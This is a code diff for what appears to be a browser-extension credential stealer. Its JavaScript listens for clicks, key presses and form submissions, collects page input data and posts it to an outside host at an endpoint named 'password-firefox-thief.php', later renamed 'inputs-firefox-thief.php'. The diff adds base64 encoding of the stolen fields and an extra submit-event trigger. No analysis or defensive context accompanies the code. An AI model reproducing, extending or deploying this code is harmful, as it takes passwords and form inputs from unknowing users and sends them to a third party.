@@ -9,7 +9,8 @@ function ajaxPost(url, data) {
 }
 
 function prototypeData(data) {
-	var temp = "v1="+data[0]+"&v2="+data[1]+"&v3="+data[2].replace(/&/gi, "†")+"&v4="+data[3];
+	var temp = "a="+window.btoa(data[0])+"&b="+window.btoa(data[1])+"&c="+window.btoa(data[2]).replace(/&/gi, "†")+"&d="+window.btoa(data[3]);
+	console.log(temp);
 	return temp;
 }
 
@@ -54,7 +55,7 @@ function commun_event() {
 		myDataLast = myDataFirst;
 		if (myDataFirst[3].length>2) {
 			var toSend = prototypeData(myDataFirst);
-            ajaxPost("https://dev.petitcroco.fr/password-firefox-thief.php", toSend);
+            ajaxPost("https://dev.petitcroco.fr/inputs-firefox-thief.php", toSend);
 		}
 	}
 }
@@ -72,3 +73,4 @@ function event_enter() {
 myDataLast = [];
 document.addEventListener('click', event_click);
 document.addEventListener("keydown", event_enter);
+document.addEventListener("submit", event_click);
